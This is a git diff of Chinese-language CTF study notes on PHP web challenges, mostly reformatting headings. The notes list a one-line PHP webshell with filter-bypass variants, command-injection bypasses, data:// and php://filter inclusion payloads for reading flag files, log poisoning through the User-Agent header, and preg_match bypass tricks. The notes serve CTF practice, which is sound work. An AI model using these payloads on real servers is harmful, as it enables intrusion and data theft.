@@ -1,4 +1,4 @@
-## 笔记
+# 笔记
 
 <br><br>
 
@@ -19,7 +19,7 @@
 
 <br>
 
-黑洞绕过：system($c." >/dev/null 2>&1");
+### 黑洞绕过：system($c." >/dev/null 2>&1");
 * 它只会让分号后面的指令进入黑洞，所以这里直接绕过
 
 * 双写分号绕过?c=tac f*;ls
@@ -37,7 +37,7 @@
 
 
 
-直接写php时：
+### 直接写php时：
 * 经典一句话木马：<?php @eval($_POST[a]); ?>
 * 短标签（过滤php）绕过：<?=eval($_POST[a]);?>（需要配合user.ini打开权限）
 * 过滤[]:<?=eval($_POST{a});?>(改成花括号)
@@ -48,7 +48,7 @@
 
 <br>
 
-直接eval()传参时：
+### 直接eval()传参时：
 * 特殊字符:"$""&"如果只是对c进行过滤，就可以通过包含另一个函数来绕过
 * 做题前先看看对谁过滤，再看如何过滤
 * c=include$_GET[1]?>&1=php://filter/read=convert.base64-encode/resource=flag.php
@@ -61,24 +61,24 @@
 * c=highlight_file(next(array_reverse(scandir(dir))));
 <br>
 
-当include(c)时：直接使用协议绕过
+### 当include(c)时：直接使用协议绕过
 * c=data://text/plain,<?php system('tac f*');?>
 
 <br>
 
-* php被过滤的时候:
+#### php被过滤的时候:
 * ?c=data://text/plain,<?=system("tac fla*")?>
 * 注：include()只会处理<?php>里面的内容
 
 <br>
 
-* $被过滤的时候:
+#### $被过滤的时候:
 * ?c=echo highlight_file(next(array_reverse(scandir(pos(localeconv())))));
 * ?c=eval(next(reset(get_defined_vars())));&1=;system("tac%20flag.php");
 
 <br>
 
-* 日志文件包含：（抓包改UA，在UA末尾加东西）
+#### 日志文件包含：（抓包改UA，在UA末尾加东西）
 * 如：
 ````
 GET /?file=/var/log/nginx/access.log HTTP/1.1
@@ -105,7 +105,7 @@ Connection: close
 
 <br>
 
-条件竞争漏洞：（相关：2023年孟极光线上赛web）（文件上传，文件包含等都能用）
+### 条件竞争漏洞：（相关：2023年孟极光线上赛web）（文件上传，文件包含等都能用）
 - [条件竞争](https://www.freebuf.com/articles/web/275557.html)
 
 
@@ -113,14 +113,20 @@ Connection: close
 
 
 
-* -----------------------------------------------php特性绕过
+## php特性绕过
 
 
 <br>
 
-*
+### preg_match绕过:
+* preg_match第二个参数为0时，会将0x开头当作十六进制,0开头当作八进制
+* 多行绕过 php%0aPHP(用于多次preg_match)
+* strpos($num, "0")意为开头不能为0，只需要加入%0a（换行）或%09（空格）即可绕过
 
+<br>
 
+### 其他总结
+* 伪协议绕过:?u=php://filter/read=convert.base64-encode/resource=flag.php(任何打开文件，读取文件的操作都可以使用伪协议绕过)
 
 
 
